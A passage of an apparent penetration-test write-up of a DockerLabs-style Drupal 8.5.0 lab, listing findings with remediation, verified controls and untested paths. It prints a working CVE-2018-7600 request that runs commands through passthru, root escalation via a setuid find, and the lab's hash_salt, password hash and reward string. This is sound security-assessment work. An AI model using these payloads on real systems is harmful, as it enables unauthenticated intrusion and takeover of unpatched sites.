+<h2 id="5-findings">5. Findings</h2>
+<h3 id="f1--drupal-850-unauthenticated-remote-code-execution-cve-2018-7600--sa-core-2018-002">F1 — Drupal 8.5.0: unauthenticated remote code execution, CVE-2018-7600 / SA-CORE-2018-002</h3>
+<p><strong>CWE-502 (deserialization of untrusted data — render-array property injection) / CWE-20 · Critical</strong></p>
+<pre><code>POST /drupal/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax
+form_id=user_register_form&amp;_drupal_ajax=1
+&amp;mail[a][#post_render][]=passthru&amp;mail[a][#type]=markup&amp;mail[a][#markup]=id
+-&gt;
+HTTP/1.1 200 OK
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[{&quot;command&quot;:&quot;insert&quot;,&quot;method&quot;:&quot;replaceWith&quot;,&quot;selector&quot;:null,&quot;data&quot;:&quot;&lt;span class=\&quot;ajax-new-content\&quot;&gt;&lt;/span&gt;&quot;,&quot;settings&quot;:null}]
+</code></pre>
+<p>No authentication, no session, no user, no second request, and the output arrives <strong>in band</strong>.
+Root cause, in the artefact: <code>ManagedFile.php:176</code> reads <code>element_parents</code> from the query string and
+hands the addressed sub-array to <code>renderRoot()</code> at <code>:193</code>, with no validation of either the path or
+the <code>#</code>-prefixed properties inside it; the compensating control (<code>DrupalKernel::preHandle()</code> →
+<code>RequestSanitizer::sanitize()</code>) <strong>does not exist in this file</strong> — <code>find -name RequestSanitizer.php</code>
+→ 0, <code>DrupalKernel.php:544-546</code> has no sanitisation call.</p>
+<p><strong>Impact.</strong> Unauthenticated code execution as the web-server user, with the database credential
+reachable in memory. Combined with F2 it is unauthenticated-to-root.</p>
+<p><strong>Remediation.</strong> Upgrade to 8.5.8 or later (8.5.x is EOL; 8.5.1 fixes <em>this</em> advisory, 8.5.8 fixes
+the ones after it). The fix is 99 lines and one call site — there is no configuration that
+substitutes for it. As defence in depth, <code>Settings::get('sanitize_input_logging', TRUE)</code> on a patched
+branch makes the stripping visible instead of silent.</p>
+<h3 id="f2--usrbinfind-is-setuid-root-in-the-shipped-image-and--exec-runs-as-euid-0">F2 — <code>/usr/bin/find</code> is setuid root in the shipped image, and <code>-exec</code> runs as euid 0</h3>
+<p><strong>CWE-269 (improper privilege management) / CWE-732 · Critical</strong></p>
+<p><code>uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</code>, <code>Uid: 33 0 0 0</code>, and the
+manufactured oracle in <code>/root</code> written and read back (§4.3). Proof that the bit is not from the
+package: byte-identical md5 against <code>findutils.md5sums</code>, same <code>mtime</code> as <code>/usr/bin/xargs</code> from the
+same package, mode 4755 against the sibling's 755, and <code>dpkg -V</code> reporting nothing (§4.4).</p>
+<p><strong>Impact.</strong> Any process that can execute <code>find</code> — which on this host is <code>www-data</code>, i.e. every
+request — becomes euid 0. This is the whole second half of the lab.</p>
+<p><strong>Remediation.</strong> <code>chmod 0755 /usr/bin/find</code>. <code>find</code> has no reason to be setuid; the setuid bit is
+almost certainly an accident of image construction, and if it is deliberate it needs a comment saying
+what it is for. Add a build assertion — <code>find / -perm -4000</code> diffed against the expected set — to
+the image build, the way §3 of the RUNBOOK reads <code>entrypoint.sh</code> for exactly this reason.</p>
+<h3 id="f3--the-entire-php-in-subdirectory-boundary-rests-on-one-word-in-a-file-the-operator-has-never-read">F3 — the entire PHP-in-subdirectory boundary rests on one word in a file the operator has never read</h3>
+<p><strong>CWE-16 (configuration) / CWE-693 (protection mechanism failure) · High — and the negative result is the point</strong></p>
+<p>Drupal's boundary is one rewrite rule:</p>
+<pre><code>/var/www/html/drupal/.htaccess:155
+  RewriteRule &quot;^(.+/.*|autoload)\.php($|/)&quot; - [F]
+</code></pre>
+<p>and <code>.htaccess</code> files are only read at all if the server permits them. Two files disagree:</p>
+<pre><code>/etc/apache2/apache2.conf:170-174          &lt;Directory /var/www/&gt;   Options Indexes FollowSymLinks
+                                                              AllowOverride None
+/etc/apache2/conf-enabled/docker-php.conf:8-11
+                        &lt;Directory /var/www/&gt;   Options -Indexes
+                                                 AllowOverride All
+</code></pre>
+<p><code>conf-enabled/*.conf</code> is included at <code>apache2.conf:222</code>, <strong>after</strong> the <code>&lt;Directory&gt;</code> block at <code>:170</code>,
+so <code>AllowOverride All</code> wins. Both are shipped by the same official <code>php:7.2.3-apache</code> image.</p>
+<p><strong>The differential, which is the only reason I know which directive is live:</strong></p>
+<table>
+<thead>
+<tr>
+<th>State</th>
+<th><code>sites/default/files/lab82_sub.php</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>a) as deployed</td>
+<td><strong>403</strong></td>
+</tr>
+<tr>
+<td>b) <code>files/.htaccess</code> replaced with only the <code>SetHandler</code> catch-all</td>
+<td>403</td>
+</tr>
+<tr>
+<td>c) <code>files/.htaccess</code> replaced with only the <code>&lt;IfModule mod_php5.c&gt;</code> guard</td>
+<td>403</td>
+</tr>
+<tr>
+<td>d) <strong><code>files/.htaccess</code> deleted entirely</strong></td>
+<td><strong>403</strong></td>
+</tr>
+<tr>
+<td>e) both probes created, <code>files/.htaccess</code> still deleted</td>
+<td>403 — but the same file at the <strong>Drupal root</strong> → <strong>200, <code>LAB82-PHP-EXEC uid=33</code></strong></td>
+</tr>
+<tr>
+<td>f) <code>drupal/.htaccess:155</code> <code>[F]</code> → <code>[L]</code></td>
+<td><strong>200, <code>LAB82-PHP-EXEC uid=33</code></strong></td>
+</tr>
+<tr>
+<td>g) line 155 restored, <code>AllowOverride All</code> → <code>None</code> in <code>docker-php.conf:10</code></td>
+<td><strong>200, <code>LAB82-PHP-EXEC uid=33</code></strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Reading of the table.</strong> Deleting Drupal's own <code>files/.htaccess</code> — the file whose name, comment
+(<code>Do not remove</code>) and placement all say it is the security boundary — changes <strong>nothing</strong> (d). The
+load-bearing control is line 155 of the <em>root</em> file (f). And the whole of that is contingent on
+<code>AllowOverride</code> (g): with the standard Apache value, Drupal's rewrite rule stops being read and the
+entire <code>core/</code>, <code>sites/</code>, <code>vendor/</code> and <code>modules/</code> trees become writable-then-executable surfaces —
+while the site keeps serving 200 on every page and logs <strong>no error at all</strong>.</p>
+<p><strong>Remediation.</strong> Move the boundary out of <code>.htaccess</code> and into the vhost, where it cannot be voided
+by an <code>AllowOverride</code> in a file from another project:</p>
+<pre><code class="language-apache">&lt;Directory /var/www/html/drupal&gt;
+    &lt;FilesMatch &quot;\.php$&quot;&gt;
+        Require all granted
+    &lt;/FilesMatch&gt;
+    # everything else, anywhere in the tree
+&lt;/Directory&gt;
+</code></pre>
+<p>or, more simply, <code>php_admin_value open_basedir</code> / <code>disable_functions</code> scoped to the pool, or move
+the document root down to <code>drupal/</code> so there is no subdirectory tree to protect at all (which is also
+what the catalogue's &quot;not on the root of port 80&quot; is complaining about, one level up from here).
+Whichever you pick: <strong>make it impossible for the guard to be present and inert</strong>, which is the exact
+failure mode here and the exact failure mode in lab 146.</p>
+<h3 id="f4--sitesdefaultsettingsphp-is-mode-444-and-holds-the-hash_salt">F4 — <code>sites/default/settings.php</code> is mode 444 and holds the <code>hash_salt</code></h3>
+<p><strong>CWE-522 / CWE-276 · High (lateral — stated precisely, see below)</strong></p>
+<pre><code>$ stat -c '%n mode=%a size=%s owner=%U:%G' /var/www/html/drupal/sites/default/settings.php
+/var/www/html/drupal/sites/default/settings.php mode=444 size=32133 owner=www-data:www-data
+
+settings.php:300:  $settings['hash_salt'] = 'uBEGMYLcuSjIMRM1pENikjlmbYFEryEyQQ9RqyCpqk36iElxl8I0yZdzB5EmVpdIxsdW8s_7BA';
+settings.php:788-793: $databases['default']['default'] = array ('database' =&gt; 'sites/default/files/.ht.sqlite', …);
+</code></pre>
+<p>Mode <strong>444</strong> means every local account on the host reads it — <code>ballenita</code> included, and every future
+service account, and every process that lands a shell as any uid. <code>hash_salt</code> is the seed for
+Drupal's session and CSRF-token derivation, so a local account can mint a valid session for
+<code>uid=1 ballenita</code> without ever touching that account's password hash.</p>
+<p><strong>This is a lateral finding and the writeup says so.</strong> It is <strong>not</strong> remotely reachable: seven
+variants probed, <code>settings.php</code> → 403 (Drupal's own <code>&lt;FilesMatch&gt;</code> at <code>drupal/.htaccess:6-8</code>),
+<code>settings.phps</code>/<code>settings.php~</code>/<code>settings.php.bak</code>/<code>%2ephp</code> → 404/403, and a whole-tree search for
+backup variants. The foothold is hop 1, and the two compose.</p>
+<p><strong>Remediation.</strong> <code>chmod 640</code>, owner <code>www-data</code>, group a dedicated <code>drupal</code> group. Keep the file out
+of the document root entirely — the shipped default <code>default.settings.php</code> shows the intended
+pattern, and this lab moved <code>settings.php</code> into the web root and then made it readable by all.</p>
+<h3 id="f5--the-sqlite-datastore-is-mode-644-the-whole-application-state-is-world-readable-on-the-host">F5 — the SQLite datastore is mode 644: the whole application state is world-readable on the host</h3>
+<p><strong>CWE-732 / CWE-922 · Medium (lateral)</strong></p>
+<pre><code>/var/www/html/drupal/sites/default/files/.ht.sqlite mode=644 size=11112448 owner=www-data:www-data
+</code></pre>
+<p>64 tables, 174 config objects, 1 real user, 0 nodes. Any local account reads every password hash, the
+<code>user_pass_reset</code> tokens if any are live, and the full config — including <code>system.site</code>, the filter
+formats and the <code>editor</code> entities. Not remotely reachable: <code>GET /drupal/sites/default/files/.ht.sqlite</code>
+→ <strong>403</strong>, from <code>&lt;FilesMatch &quot;^\.ht&quot;&gt;</code> (<code>apache2.conf:195-197</code>), with the control that a <code>.txt</code> in the
+<em>same</em> directory returns <strong>200</strong>. That control is what makes the 403 a fact about the <em>name</em> rather
+than about the directory.</p>
+<p><strong>Remediation.</strong> Move the SQLite file out of the document root, or <code>chmod 640</code>. A dotfile name is
+not an access control; it is a filename pattern in one <code>&lt;FilesMatch&gt;</code>, and the moment somebody
+switches to nginx — which reads no <code>.htaccess</code> and honours no <code>^\.ht</code> — the entire database is
+public. <strong>This is the same &quot;the guard is a convention the next deployment will not keep&quot; shape as
+F3, and the two should be fixed in the same change.</strong></p>
+<h3 id="f6--unauthenticated-self-registration-writes-a-permanent-role-less-blocked-account-row">F6 — unauthenticated self-registration writes a permanent, role-less, blocked account row</h3>
+<p><strong>CWE-20 / CWE-400 · Low — a real negative reported next to a real positive</strong></p>
+<p>The register form is served to anonymous visitors and <strong>accepts the submission</strong>:</p>
+<pre><code>POST /drupal/user/register   form_id=user_register_form&amp;form_build_id=form-…&amp;name=lab82probe&amp;mail=lab82probe@example.invalid
+-&gt; HTTP/1.1 303, Location: http://[net-0-7]/drupal/, one SESS… cookie set
+</code></pre>
+<p>and the account is really created:</p>
+<pre><code>uid=2 name=lab82probe mail=lab82probe@example.invalid status=0
+user__roles: 1 row only — uid 1 → administrator
+</code></pre>
+<p><code>status=0</code> (blocked/pending), <strong>zero role rows for uid 2</strong>, and three independent confirmations that
+it is not a foothold: <code>/drupal/user</code> → <strong>302 to <code>/drupal/user/login</code></strong>; <code>/drupal/user/1</code> → <strong>403</strong>;
+and <code>user.settings</code> <code>register=visitors_admin_approval</code>, <code>verify_mail=1</code>.</p>
+<p>So this is <strong>not</strong> an authentication bypass, and filing it as one would be inventing a finding. What
+it <em>is</em>: an unauthenticated, unrate-limited, un-CAPTCHA'd insert into the account store, with no way
+for the operator to notice. On a real site that is a mail-relay and storage-abuse primitive, and at
+minimum a spam surface.</p>
+<p><strong>Remediation.</strong> Set <code>register</code> to <code>USER_REGISTER_ADMINISTRATORS</code> (or add a CAPTCHA + rate limit +
+mail verification). Nothing in the Drupal default profile asks you to.</p>
+<h3 id="f7--the-docroot-is-world-writable">F7 — the docroot is world-writable</h3>
+<p><strong>CWE-732 · Low (context, not a chain step)</strong></p>
+<p><code>/var/www/html mode=777 owner=www-data:www-data</code>, and <code>sites/default/files/php</code> and
+<code>…/files/php/twig</code> are <strong>777</strong> as well — the compiled-Twig cache is writable by <em>every</em> uid on the
+host, including <code>ballenita</code>. Not used in this chain (the RCE was already <code>www-data</code>), and the
+<code>[F]</code> rewrite rule stops the consequence — but it is the reason F3 matters: a world-writable
+directory one <code>AllowOverride</code> away from execution is a latent primitive, not a hardened one.</p>
+<p><strong>Remediation.</strong> <code>chmod 755</code> on the docroot, <code>750</code> on the Twig cache.</p>
+<hr />
+<h2 id="6-controls-that-held">6. Controls that held</h2>
+<p>Every row has a positive control: a case where the same detector was shown firing, or an explicit
+statement that the control's <em>success</em> path was demonstrated before the negative was believed.</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Control</th>
+<th>Positive control that proves this detector works</th>
+<th>Negative evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C1</td>
+<td>The RCE oracle discriminates, rather than always answering</td>
+<td><code>…[#post_render][]=passthru</code> with <code>[#markup]=id</code> → <strong>HTTP 200, 210 bytes, <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></strong> in the body</td>
+<td>the <strong>same request</strong> with <code>…[#post_render][]=lab82_no_such_function_zz</code> → <strong>HTTP 500, 68 bytes, zero bytes of <code>uid=</code> leaked</strong>; the treatment re-run immediately afterwards in the same shell → 200/210 B with <code>uid=33</code></td>
+</tr>
+<tr>
+<td>C2</td>
+<td><code>uid=33</code> really cannot read <code>/root</code></td>
+<td>hop 3 read the file's 35 bytes as euid 0</td>
+<td>the <strong>identical</strong> <code>cat /root/secretitomaximo.txt</code> and <code>ls -la /root/</code> as plain <code>www-data</code>, in the same request, → <code>cat: …: Permission denied</code> and <code>ls: cannot open directory '/root/': Permission denied</code> (rc=1 and rc=2)</td>
+</tr>
+<tr>
+<td>C3</td>
+<td>The setuid oracle is a real file and not a fabrication</td>
+<td><code>/root/LAB82-1790794856-root</code>, <code>-rw-r--r-- 1 root www-data 98</code>, contents = the uid/euid pair and <code>Uid: 33 0 0 0</code></td>
+<td>the <strong>same write one line later without the setuid find</strong> → <code>cannot create …: Permission denied</code>. The marker is a timestamp, in a 0700 root directory, so it cannot be confused with anything pre-existing</td>
+</tr>
+<tr>
+<td>C4</td>
+<td>The sudoers grant is pinned to two programs</td>
+<td><code>sudo -n -l</code> prints <code>User ballenita may run the following commands…</code> / <code>    (root) NOPASSWD: /bin/ls, /bin/grep</code></td>
+<td><code>sudo -n /bin/cat /root/secretitomaximo.txt</code> → <code>sudo: a password is required</code> — a third program, same session, same identity</td>
+</tr>
+<tr>
+<td>C5</td>
+<td><code>ls</code> and <code>grep</code> are <strong>not</strong> interchangeable, so the two grant lines need two fixes</td>
+<td><code>sudo -n /bin/grep . /root/secretitomaximo.txt</code> → <code>nobodycanfindthispasswordrootrocks</code></td>
+<td><code>sudo -n /bin/ls /root/secretitomaximo.txt</code> → prints <code>/root/secretitomaximo.txt</code> and <strong>nothing else</strong>: a <code>200</code>-shaped, successful, content-free result. Reading it as &quot;the grant works for the reward&quot; would have been the corpus's &quot;a 200 with an empty body is <code>die</code>, not success&quot; (§115, §168) wearing sudoers clothing</td>
+</tr>
+<tr>
+<td>C6</td>
+<td>The 403 in <code>files/</code> is a real boundary, not a blanket refusal</td>
+<td>a <code>.php</code> file at the <strong>Drupal root</strong> → <strong>200, 22 B, <code>LAB82-PHP-EXEC uid=33</code></strong> — executing, in the same tree, minutes apart</td>
+<td>a <code>.txt</code> in the <strong>same</strong> <code>files/</code> directory → <strong>200, 40 B</strong>; a nonexistent path → <strong>404</strong>. So 403 is specific to <em>subdirectory</em> + <code>.php</code>, and the 200s are not the server refusing everything</td>
+</tr>
+<tr>
+<td>C7</td>
+<td>Drupal's <code>&lt;FilesMatch&gt;</code> is live and is <em>its</em> control, not Apache's</td>
+<td><code>GET /drupal/composer.lock</code> → <strong>403</strong>; <code>GET /drupal/sites/default/default.settings.php</code> → <strong>403</strong>; <code>GET /drupal/vendor/README.md</code> → <strong>403</strong></td>
+<td><code>GET /drupal/robots.txt</code> → <strong>200, 1 596 B</strong> and <code>GET /drupal/core/CHANGELOG.txt</code> → <strong>200, 399 B</strong> in the same directory tree: the rule matches a set of extensions, not everything. Source: <code>drupal/.htaccess:6-8</code>, which names <code>composer\.(json|lock)$</code> explicitly</td>
+</tr>
+<tr>
+<td>C8</td>
+<td><code>.ht.sqlite</code> is blocked by <strong>name</strong>, and only by name</td>
+<td>a <code>.txt</code> in the identical directory → <strong>200, 40 B</strong></td>
+<td><code>GET .ht.sqlite</code> → <strong>403</strong>, attributed to <code>&lt;FilesMatch &quot;^\.ht&quot;&gt;</code> + <code>Require all denied</code> (<code>apache2.conf:195-197</code>) by the error log line <code>authz_core:error … AH01630: client denied by server configuration: /var/www/html/drupal/sites/default/files/.ht.sqlite</code> — the <em>only</em> 403 in this engagement with a log line naming its own cause</td>
+</tr>
+<tr>
+<td>C9</td>
+<td><code>settings.php</code> is not remotely readable</td>
+<td><code>/drupal/</code> and <code>/drupal/core/CHANGELOG.txt</code> render fine, so the server is serving the docroot</td>
+<td><code>settings.php</code> → 403; <code>.phps</code>, <code>.php~</code>, <code>.php.bak</code>, <code>%2ephp</code>, <code>index.php/settings.php</code> → 404/403. Seven variants, plus F7's whole-tree reason that no backup exists</td>
+</tr>
+<tr>
+<td>C10</td>
+<td>The <code>/tmp/.htaccess</code> decoy is inert, and I can say <em>why</em></td>
+<td>it is 685 bytes, byte-identical in content to the shipped <code>files/.htaccess</code>, <code>-r--r--r-- www-data</code>, dated <code>Oct 16 2024</code> — it is unmistakably meant to be a guard</td>
+<td><code>DocumentRoot /var/www/html</code> (<code>000-default.conf:12</code>) and <code>/tmp</code> is outside it, so Apache never reads it. <strong>A tester who greps <code>.htaccess</code> finds two guards and concludes the boundary is doubled. It is not — one of them is a photograph of a guard</strong></td>
+</tr>
+<tr>
+<td>C11</td>
+<td>The stock <code>files/.htaccess</code> PHP-engine half is dead on this image</td>
+<td><code>apache2ctl -M</code> → <code>php7_module (shared)</code>, so <code>&lt;IfModule mod_php5.c&gt;</code> is <strong>FALSE</strong></td>
+<td>and yet a subdirectory <code>.php</code> still 403s — because the <code>SetHandler</code> line and the root <code>[F]</code> rule do the work. A tester who trusts the <code>php_flag</code> is trusting a control that is not running</td>
+</tr>
+<tr>
+<td>C12</td>
+<td><code>www-data</code>'s writable set is small, and two tools agree</td>
+<td><code>find / -xdev -writable -type f</code> <strong>as www-data</strong> → <strong>49</strong> files</td>
+<td>an independent <code>test -w</code> loop over the same 49 → <strong>49</strong>. Two tools, same shell, same answer, and the count is large enough that &quot;found nothing&quot; and &quot;looked nowhere&quot; are distinguishable (§11, §14). The 49 are all in the docroot or the Twig cache; <strong>0</strong> are owned by another principal in a way that escalates</td>
+</tr>
+<tr>
+<td>C13</td>
+<td>No other setuid or capability escalation</td>
+<td>14 setuid/setgid binaries, and <code>find</code> is provably the planted one (§4.4)</td>
+<td>the other 13 are stock (<code>mount</code>, <code>su</code>, <code>umount</code>, <code>unix_chkpwd</code>, <code>chage</code>, <code>chfn</code>, <code>chsh</code>, <code>expiry</code>, <code>gpasswd</code>, <code>newgrp</code>, <code>passwd</code>, <code>sudo</code>, <code>wall</code>); <code>getcap -r /</code> → <strong>0 lines</strong>; <code>chroot</code> is <strong>not</strong> setuid, so there is no drop-privilege helper. The <code>su</code> and <code>sudo</code> refusals in §4.5 are measured, not assumed</td>
+</tr>
+<tr>
+<td>C14</td>
+<td>No scheduled job, no mailer, no second service is a vector</td>
+<td><code>ps</code> names the whole process set: PID 1 <code>apache2 -DFOREGROUND</code> and five <code>www-data</code> children, and nothing else</td>
+<td>no <code>cron</code>/<code>crond</code> binary is installed at all; no MTA (<code>mail()</code> has no transport, which is also why the CVE's <code>passthru</code> was the right choice over the mail-based variants); <code>/proc/net/udp</code> header only</td>
+</tr>
+<tr>
+<td>C15</td>
+<td>The authenticated role has no permissions, so even a <em>successful</em> registration would be a ceiling</td>
+<td>—</td>
+<td><code>config</code> row <code>user.role_authenticated</code> is the <strong>empty string</strong>. Not a &quot;denied&quot; answer; an empty permission set, which is the stronger form</td>
+</tr>
+<tr>
+<td>C16</td>
+<td>The target did not change under me (the lab-108 hazard)</td>
+<td>version re-read at the very end: <code>Drupal.php:85</code> still <code>8.5.0</code>; served header still <code>X-Generator: Drupal 8</code></td>
+<td>and structurally: <code>update</code> is <strong>absent</strong> from <code>core.extension</code> (so no request-triggered updater exists) <strong>while egress is available</strong> — <code>curl https://www.drupal.org</code> → <strong>302</strong>. Nothing stopped an update; there was nothing scheduled. This is lab 32's finding, re-confirmed: a CMS with a manual updater needs no network control, and you should not credit a hardened network for a version that was never going to move</td>
+</tr>
+<tr>
+<td>C17</td>
+<td>The chain is a property of the target, not of a moment</td>
+<td>the entire §4.3 transcript <strong>replayed byte-for-byte</strong> (1 204 bytes, identical text) on a container <code>docker rm</code>'d and recreated from <code>ejotapete:latest</code></td>
+<td>—</td>
+</tr>
+<tr>
+<td>C18</td>
+<td>The editor/CKEditor AJAX surface is closed to anonymous</td>
+<td>both editors exist and are enabled: <code>editor.editor.basic_html</code> and <code>editor.editor.full_html</code>, <code>status =&gt; true</code></td>
+<td><code>GET /drupal/editor/dialog/image/{basic_html,full_html}</code> → <strong>403</strong>, and the reason is in the artefact: <code>EditorAccessControlHandler.php:19-22</code> delegates <code>use</code> to <code>$editor-&gt;getFilterFormat()-&gt;access('use', …)</code>, which anonymous does not hold. Two editors, one answer</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-not-tested-scope-not-gaps-in-effort">7. NOT tested (scope, not gaps in effort)</h2>
+<ul>
+<li><strong>Any config import / <code>config.sync</code> write.</strong> This is <em>the</em> Drupal-shaped write primitive (§3.2,
+point 3): 174 config objects in the <code>config</code> table, and <code>config_directories['sync']</code> at
+<code>settings.php:795</code> points at a directory of mode <strong>775</strong> that <code>www-data</code> can write. I did not
+import anything, because every route to the import UI requires an authenticated administrator and
+there is none reachable (N2, N3, C15). <strong>So: unauthenticated config import is UNTESTED, and I make
+no claim about it in either direction</strong> — the same posture lab 115 took with its LMS escalation.</li>
+<li><strong>Writing <code>sites/default/services.yml</code> as root.</strong> The primitive is closed for <code>www-data</code> and I
+measured that (mode 555, <code>touch</code> → <code>Permission denied</code>). I did not test whether some <em>other</em> path in
+the image can write into a 555 directory.</li>
+<li><strong>Cracking <code>ballenita</code>'s SHA-512</strong> (<code>$6$qpDmGZl6$zbw0hiPWUMk5x8VJOTotEmncYdbAc5pO.nQEozxykVTiydjJbJaLwUmKvx803Kh9IA3hs47jG/orkMBeqj3jF.</code>).
+It would take minutes on a GPU, and an euid-0 attacker can simply <em>set</em> the password instead. Not
+attempted; §4.5's claim is scoped accordingly and does not depend on it.</li>
+<li><strong>Brute-forcing the Drupal administrator's password</strong> from the <code>users_field_data</code> hash. Not
+attempted; and there is no need, because F1 is unauthenticated.</li>
+<li><strong>Any CVE other than SA-CORE-2018-002.</strong> SA-CORE-2019-003 (CVE-2019-0038) needs <code>rest</code> or JSON:API;
+<code>rest</code> is not in <code>core.extension</code> and JSON:API does not exist before 8.7, so it is <strong>out of range
+for this version</strong> — and per the engagement constraints a real third-party vulnerability is
+documented, never probed, anyway. The one CVE this engagement exercised was exercised <strong>only
+against this lab container</strong>, and the decision to do so is stated here rather than assumed: the
+governing constraint is <em>attack only your lab; no third-party infrastructure, ever</em>, and the
+catalogue's own precedent (lab 90, &quot;real CVE in a WordPress plugin&quot;) is a CVE executed on the lab.
+There is also <strong>no mailer in this image</strong>, so the mail-delivery variants of the exploit family
+cannot send anything even accidentally.</li>
+<li><strong>Whether the <code>#post_render</code> vector reaches other forms or routes.</strong> One form
+(<code>user_register_form</code>), one route, one <code>element_parents</code> path. The mechanism is general — the sink
+is in a shared element class — but I measured one instance of it and say so.</li>
+<li><strong>The <code>user_pass</code> route as a vector.</strong> Four attempts, <strong>0</strong> executions, and the reason is in the
+artefact rather than guessed: <code>core/lib/Drupal/Core/Render/Element/Textfield.php:73-82</code> discards
+non-scalar input (<code>if (!is_scalar($input)) { $input = ''; }</code>), so the nested <code>#</code>-array never becomes
+an element property. The observable was a <strong>500</strong>, and the error log said why:
+<code>FormAjaxResponseBuilder.php:67: &quot;The specified #ajax callback is empty or not callable.&quot;</code> — i.e. the
+form was cached clean and nothing executed. A <code>500</code> here is a <strong>negative with a mechanism</strong>, and it
+is listed here rather than under negatives only because the mechanism matters.</li>
+</ul>
+<h2 id="8-discarded-with-reason">8. Discarded with reason</h2>
+<table>
+<thead>
+<tr>
+<th>Hypothesis</th>
+<th>Why discarded</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&quot;It is not Drupal&quot; — the reflex after labs 32/220/12/26</td>
+<td><code>core/lib/Drupal.php:85</code> <code>const VERSION = '8.5.0'</code>, <code>DRUPAL_VERSION=8.5.0</code> in the image env, <code>standard.info.yml:47</code> <code>version: '8.5.0'</code>, served <code>X-Generator: Drupal 8</code>. <strong>The label is right.</strong> The point of the check was to establish that, not to assume it</td>
+</tr>
+<tr>
+<td>&quot;A contrib module or theme is the surface&quot;</td>
+<td><code>modules/</code> and <code>themes/</code> hold <strong>1</strong> entry each (<code>README.txt</code>); 42 <code>core.extension</code> names, <strong>41</strong> resolve to a core directory and the 42nd is the <em>profile</em>. Zero third-party code in the deployment</td>
+</tr>
+<tr>
+<td>&quot;The Form API's <code>FormBuilder.php</code> is the vulnerable file&quot;</td>
+<td><code>diff -u</code> between the shipped 8.5.0 copy and the 8.5.1 copy: <strong>no output</strong>. The fix is <code>Drupal\Core\Security\RequestSanitizer</code>, one layer above every form. Diffing the file that &quot;must&quot; be vulnerable proves nothing here (§4.1)</td>
+</tr>
+<tr>
+<td>&quot;Open registration gets me a session&quot;</td>
+<td>submission <strong>succeeds</strong> (303, cookie set) and creates <code>uid=2 status=0</code> with <strong>0</strong> role rows; <code>/drupal/user</code> → 302 to login, <code>/drupal/user/1</code> → 403. <code>register=visitors_admin_approval</code>, <code>verify_mail=1</code>. F6 files the <em>real</em> consequence; the foothold claim is false</td>
+</tr>
+<tr>
+<td>&quot;The CKEditor image dialog is the vector&quot;</td>
+<td><code>/drupal/editor/dialog/image/{basic_html,full_html}</code> → 403; <code>EditorAccessControlHandler.php:19-22</code> delegates to the text format's <code>use</code> access, which anonymous lacks. Two editors, one answer (C18)</td>
+</tr>
+<tr>
+<td>&quot;<code>/drupal/.htaccess</code> and <code>files/.htaccess</code> both guard the tree&quot;</td>
+<td>the 7-state differential in F3: <strong>deleting <code>files/.htaccess</code> changes nothing</strong>, neutering <code>drupal/.htaccess:155</code> opens every subdirectory, and flipping one <code>AllowOverride</code> word does the same. One boundary, one rule, one dependency</td>
+</tr>
+<tr>
+<td>&quot;<code>php_admin_flag engine off</code> protects the files directory&quot;</td>
+<td><code>apache2ctl -M</code> → <code>php7_module (shared)</code>; the stock guard's <code>&lt;IfModule mod_php5.c&gt;</code> is <strong>FALSE</strong>. It is not what is protecting anything, and the <code>SetHandler</code> line in the same file is redundant with the root rule (C11)</td>
+</tr>
+<tr>
+<td>&quot;<code>/tmp/.htaccess</code> is a second copy of the guard&quot;</td>
+<td>it is a photograph of one. <code>/tmp</code> is outside <code>DocumentRoot /var/www/html</code>; Apache never reads it (C10)</td>
+</tr>
+<tr>
+<td>&quot;A PHP file in the files directory executes&quot;</td>
+<td><strong>403</strong>, in all 7 states of the differential except the two that deliberately break the guard. The 200-shaped control that makes this a <em>measured</em> negative and not an assumption is the same file at the Drupal root → 200, executing (C6)</td>
+</tr>
+<tr>
+<td>&quot;<code>sudo</code> reaches <code>ballenita</code>'s grant from the euid-0 position&quot;</td>
+<td><code>sudo -n -u ballenita …</code> → <code>sudo: a password is required</code>, and <code>su -s /bin/sh ballenita</code> → <code>su: must be run from a terminal</code>. Both authenticate on the <strong>real</strong> uid, which the setuid-find hop leaves at 33. The two ladders are disjoint (§4.5)</td>
+</tr>
+<tr>
+<td>&quot;<code>/root/secretitomaximo.txt</code> is the Drupal user's password&quot;</td>
+<td>the Drupal user is <code>uid=1 ballenita find@dockerlabs.es</code>; the OS user is <code>ballenita:x:1000:…</code>. The file is the lab's reward string, and the two identities merely share a name. I did not attempt to use the string as a credential anywhere</td>
+</tr>
+<tr>
+<td>&quot;The reward is a <code>FLAG{}</code> somewhere&quot;</td>
+<td>§9's sweep: 23 898/23 898 files, 1 hit, inspected and it is <code>.ui-icon-flag{</code> in a Drupal aggregate CSS</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="9-reward">9. Reward</h2>
+<p><strong>No <code>FLAG{}</code> exists anywhere on this host.</strong> Reported as a measured absence with the search, run
+<strong>as <code>euid=0(root)</code></strong> so there is no unsearchable location to caveat — executed through the
+setuid-<code>find</code> hop, not through <code>docker exec</code>:</p>
+<pre><code>total files on -xdev:                                 23898
+files the UNCAPPED content sweep opened:              23898
+files containing flag{|FLAG{|ctf{|CTF{:                      1
+the same, case-insensitive on the bare word FLAG:     1425
+non-standard mounts checked:                                3
+</code></pre>
+<p>The single hit was <strong>opened and read</strong>, not reported: <code>sites/default/files/css/css_mMHZVBW…css</code>,
+containing <code>.ui-icon-flag{background-position:-16px -112px;}</code> — a jQuery UI class in a Drupal
+aggregate stylesheet. The 1 425 files containing the bare word <code>flag</code> are Drupal core. The three
+mounts are Docker's own <code>/etc/resolv.conf</code>, <code>/etc/hostname</code>, <code>/etc/hosts</code>.</p>
+<p><strong>Through the application's own store</strong> (the filesystem sweep cannot see a SQLite page, and a
+regression here is exactly lab 102's defect): <strong>68 tables, 174 config objects, 1 real user
+(<code>uid=1 ballenita</code>), 0 nodes, 1 role assignment (<code>uid=1 → administrator</code>).</strong></p>
+<p><strong>What the platform did serve</strong> is a file, and the file is the reward:</p>
+<pre><code>/root/secretitomaximo.txt   -rw-r--r-- 1 root root 35 Oct 16 2024
+nobodycanfindthispasswordrootrocks
+</code></pre>
